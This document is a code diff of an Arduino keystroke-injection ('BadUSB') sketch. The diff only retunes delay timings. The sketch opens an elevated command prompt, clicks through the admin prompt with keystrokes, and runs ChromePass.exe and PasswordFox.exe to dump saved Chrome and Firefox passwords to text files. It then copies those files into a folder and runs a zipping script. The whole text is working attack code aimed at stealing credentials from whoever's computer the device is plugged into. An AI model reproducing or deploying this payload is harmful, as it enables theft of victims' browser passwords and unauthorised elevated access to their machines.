@@ -19,9 +19,9 @@ void setup() {
   delay(100);
   Keyboard.print("powershell Start-Process cmd -Verb runAs");
   typeKey(KEY_RETURN);
-  delay(1000);
+  delay(100);
   Keyboard.press(KEY_LEFT_ARROW);
-  delay(1000);
+  delay(100);
   typeKey(KEY_RETURN);
   delay(1000);
   Keyboard.print("cd / & mkdir chrome & cd chrome");
@@ -41,13 +41,13 @@ void setup() {
   delay(100);
   Keyboard.print("ChromePass.exe /stext ChromePass.txt");
   typeKey(KEY_RETURN);
-  delay(1000);
+  delay(8000);
   Keyboard.print("PasswordFox.exe /stext PasswordFox.txt");
   typeKey(KEY_RETURN);
-  delay(1000);
+  delay(8000);
   Keyboard.print("for %I in (ChromePass.txt PasswordFox.txt) do copy %I c:\\chrome\\Password");
   typeKey(KEY_RETURN);
-  delay(100);
+  delay(1000);
   Keyboard.print("powershell ./zipping.ps1");
   typeKey(KEY_RETURN);
   delay(100);
